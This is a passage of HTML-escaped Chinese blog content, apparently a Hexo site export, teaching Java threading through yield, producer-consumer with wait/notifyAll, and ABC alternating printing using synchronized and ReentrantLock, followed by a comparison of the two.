class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Main thread is started!</span><br><span class=\"line\">Athread is started!</span><br><span class=\"line\">Athread is stopped!</span><br><span class=\"line\">Main thread is stopped!</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>yield()</code> : <code>运行</code>–&gt;<code>可运行</code>,让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。因此，使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证yield()达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyThread</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">5</span> ; i++)</span><br><span class=\"line\">            System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                    + <span class=\"string\">\" in control\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Driver Class</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadTest</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[]args)</span></span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        MyThread t = <span class=\"keyword\">new</span> MyThread();</span><br><span class=\"line\">        t.start();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">5</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Control passes to child thread</span></span><br><span class=\"line\">            Thread.yield();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// After execution of child Thread</span></span><br><span class=\"line\">            <span class=\"comment\">// main thread takes over</span></span><br><span class=\"line\">            System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                    + <span class=\"string\">\" in control\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可能的情况：</p>\n<ul>\n<li>main运行时让掉CPU，过后main抢到CPU继续执行</li>\n<li>main运行时让掉CPU，过后子线程抢到CPU继续执行</li>\n</ul>\n<p>所以输出可能是<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br></pre></td></tr></table></figure></p>\n<p>也可能是<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"生产者消费者\"><a href=\"#生产者消费者\" class=\"headerlink\" title=\"生产者消费者\"></a>生产者消费者</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.LinkedList;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Queue;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Random;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProducerCustomer</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Solving Producer Consumper Problem\"</span>);</span><br><span class=\"line\">        Queue&lt;Integer&gt; buffer = <span class=\"keyword\">new</span> LinkedList&lt;&gt;();</span><br><span class=\"line\">        <span class=\"keyword\">int</span> maxSize = <span class=\"number\">10</span>;</span><br><span class=\"line\">        Thread producer = <span class=\"keyword\">new</span> Producer(buffer, maxSize, <span class=\"string\">\"PRODUCER\"</span>);</span><br><span class=\"line\">        Thread consumer = <span class=\"keyword\">new</span> Consumer(buffer, maxSize, <span class=\"string\">\"CONSUMER\"</span>);</span><br><span class=\"line\">        producer.start(); consumer.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Producer</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Queue&lt;Integer&gt; queue;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> maxSize;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Producer</span><span class=\"params\">(Queue&lt;Integer&gt; queue, <span class=\"keyword\">int</span> maxSize, String name)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.queue = queue;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.maxSize = maxSize;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span> <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"keyword\">true</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">synchronized</span> (queue) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (queue.size() == maxSize) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        System.out .println(<span class=\"string\">\"Queue is full, \"</span> + <span class=\"string\">\"Producer thread waiting for \"</span> + <span class=\"string\">\"consumer to take something from queue\"</span>);</span><br><span class=\"line\">                        queue.wait();</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;</span><br><span class=\"line\">                        ex.printStackTrace(); &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Random random = <span class=\"keyword\">new</span> Random();</span><br><span class=\"line\">                <span class=\"keyword\">int</span> i = random.nextInt();</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"Producing value : \"</span> + i);</span><br><span class=\"line\">                queue.add(i);</span><br><span class=\"line\">                queue.notifyAll();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Consumer</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Queue&lt;Integer&gt; queue;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> maxSize;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Consumer</span><span class=\"params\">(Queue&lt;Integer&gt; queue, <span class=\"keyword\">int</span> maxSize, String name)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.queue = queue;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.maxSize = maxSize;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span> <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">synchronized</span> (queue) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (queue.isEmpty()) &#123;</span><br><span class=\"line\">                    System.out.println(<span class=\"string\">\"Queue is empty,\"</span> + <span class=\"string\">\"Consumer thread is waiting\"</span> + <span class=\"string\">\" for producer thread to put something in queue\"</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        queue.wait();</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;</span><br><span class=\"line\">                        ex.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"Consuming value : \"</span> + queue.remove());</span><br><span class=\"line\">                queue.notifyAll();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"ABC交替打印\"><a href=\"#ABC交替打印\" class=\"headerlink\" title=\"ABC交替打印\"></a>ABC交替打印</h3><h4 id=\"synchronized方式\"><a href=\"#synchronized方式\" class=\"headerlink\" title=\"synchronized方式\"></a>synchronized方式</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ABC_Synch</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadPrinter</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> Object prev;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> Object self;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">ThreadPrinter</span><span class=\"params\">(String name, Object prev, Object self)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.prev = prev;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.self = self;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> count = <span class=\"number\">10</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (count &gt; <span class=\"number\">0</span>) &#123;<span class=\"comment\">// 多线程并发，不能用if，必须使用whil循环</span></span><br><span class=\"line\">                <span class=\"keyword\">synchronized</span> (prev) &#123; <span class=\"comment\">// 先获取 prev 锁</span></span><br><span class=\"line\">                    <span class=\"keyword\">synchronized</span> (self) &#123;<span class=\"comment\">// 再获取 self 锁</span></span><br><span class=\"line\">                        System.out.print(name);<span class=\"comment\">// 打印</span></span><br><span class=\"line\">                        count--;</span><br><span class=\"line\"></span><br><span class=\"line\">                        self.notifyAll();<span class=\"comment\">// 唤醒其他线程竞争self锁，注意此时self锁并未立即释放。</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// 此时执行完self的同步块，这时self锁才释放。</span></span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (count == <span class=\"number\">0</span>) &#123;<span class=\"comment\">// 如果count==0,表示这是最后一次打印操作，通过notifyAll操作释放对象锁。</span></span><br><span class=\"line\">                            prev.notifyAll();</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                            prev.wait(); <span class=\"comment\">// 立即释放 prev锁，当前线程休眠，等待唤醒</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                        e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Object a = <span class=\"keyword\">new</span> Object();</span><br><span class=\"line\">        Object b = <span class=\"keyword\">new</span> Object();</span><br><span class=\"line\">        Object c = <span class=\"keyword\">new</span> Object();</span><br><span class=\"line\">        ThreadPrinter pa = <span class=\"keyword\">new</span> ThreadPrinter(<span class=\"string\">\"A\"</span>, c, a);</span><br><span class=\"line\">        ThreadPrinter pb = <span class=\"keyword\">new</span> ThreadPrinter(<span class=\"string\">\"B\"</span>, a, b);</span><br><span class=\"line\">        ThreadPrinter pc = <span class=\"keyword\">new</span> ThreadPrinter(<span class=\"string\">\"C\"</span>, b, c);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(pa).start();</span><br><span class=\"line\">        Thread.sleep(<span class=\"number\">10</span>);<span class=\"comment\">// 保证初始ABC的启动顺序</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(pb).start();</span><br><span class=\"line\">        Thread.sleep(<span class=\"number\">10</span>);</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(pc).start();</span><br><span class=\"line\">        Thread.sleep(<span class=\"number\">10</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由交替打印代码可以得出<code>wait()</code>和<code>notify()</code>的区别</p>\n<ul>\n<li>wait() 与 notify/notifyAll() 是Object类的方法，在执行两个方法时，要先获得锁。</li>\n<li>当线程执行wait()时，会把当前的锁释放，然后让出CPU，进入等待状态。</li>\n<li>当执行notify/notifyAll方法时，会唤醒一个处于等待该 对象锁 的线程，然后继续往下执行，直到执行完退出对象锁锁住的区域（synchronized修饰的代码块）后再释放锁。</li>\n</ul>\n<p><strong><code>notify/notifyAll()</code>执行后，并不立即释放锁，而是要等到执行完临界区中代码后，再释放。</strong></p>\n<h4 id=\"lock方式\"><a href=\"#lock方式\" class=\"headerlink\" title=\"lock方式\"></a>lock方式</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.locks.Lock;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ABC_Lock</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Lock lock = <span class=\"keyword\">new</span> ReentrantLock();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> state = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadA</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    lock.lock();</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (state % <span class=\"number\">3</span> == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        System.out.print(<span class=\"string\">\"A\"</span>);</span><br><span class=\"line\">                        state++;</span><br><span class=\"line\">                        i++;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    lock.unlock();\t<span class=\"comment\">// 必须放在finally中</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadB</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    lock.lock();</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (state % <span class=\"number\">3</span> == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                        System.out.print(<span class=\"string\">\"B\"</span>);</span><br><span class=\"line\">                        state++;</span><br><span class=\"line\">                        i++;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    lock.unlock();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadC</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    lock.lock();</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (state % <span class=\"number\">3</span> == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                        System.out.print(<span class=\"string\">\"C\"</span>);</span><br><span class=\"line\">                        state++;</span><br><span class=\"line\">                        i++;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    lock.unlock();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> ThreadA().start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> ThreadB().start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> ThreadC().start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"synchronized-和-lock的区别\"><a href=\"#synchronized-和-lock的区别\" class=\"headerlink\" title=\"synchronized 和 lock的区别\"></a>synchronized 和 lock的区别</h4><ul>\n<li><code>synchronized</code> : 在资源竞争不是很激烈的情况下，偶尔会有同步的情形下，synchronized是很合适的。原因在于，编译程序通常会尽可能的进行优化synchronize，另外可读性非常好，不管用没用过5.0多线程包的程序员都能理解。</li>\n<li><code>lock(ReentrantLock)</code> : 提供了多样化的同步，比如有时间限制的同步，可以被Interrupt的同步（synchronized的同步是不能Interrupt的）等。在资源竞争不激烈的情形下，性能稍微比synchronized差点点。但是当同步非常激烈的时候，synchronized的性能一下子能下降好几十倍。而ReentrantLock确还能维持常态。</li>\n</ul>\n<p>我们写同步的时候，优先考虑synchronized，如果有特殊需要，再进一步优化。ReentrantLock如果用的不好，不仅不能提高性能，还可能带来灾难。</p>\n","excerpt":"<p><strong>在接触Android时候发现java基础没打好，所以回来重新打基础</strong></p>\n<h3 id=\"java线程基础\"><a href=\"#java线程基础\" class=\"headerlink\" 